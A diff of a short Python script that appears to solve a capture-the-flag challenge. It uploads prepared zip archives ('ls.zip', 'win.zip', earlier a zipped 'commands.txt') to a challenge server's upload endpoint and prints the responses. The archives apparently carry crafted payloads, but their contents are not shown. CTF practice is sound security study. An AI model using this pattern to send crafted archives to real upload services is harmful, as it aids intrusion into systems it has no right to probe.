@@ -1,23 +1,20 @@
 #!/usr/bin/python3
 import requests
 import os
+import json
 
-
-DELETE = 1
-#get_commands:
-if os.path.exists("./commands.zip") and DELETE:
-    os.remove("./commands.zip")
-os.system("zip ./commands.zip ./commands.txt")
-
-with open("./commands.zip", "rb") as f:
-    data = f.read()
-
-print("[+] Zipped!")
+with open("./ls.zip", "rb") as f:
+    data1 = f.read()
 
 url = "https://ls.csa-challenge.com/upload-zip"
 
 s = requests.Session()
 
-response = s.post(url, headers= {"Content-Type": "application/zip"},data= data)
-print(response.text)
-print(response)
+response = json.loads(s.post(url, headers= {"Content-Type": "application/zip"},data= data1).text)
+print(response["body"])
+
+with open("./win.zip", "rb") as f:
+    data2 = f.read()
+
+response = json.loads(s.post(url, headers= {"Content-Type": "application/zip"},data= data2).text)
+print(response["body"])
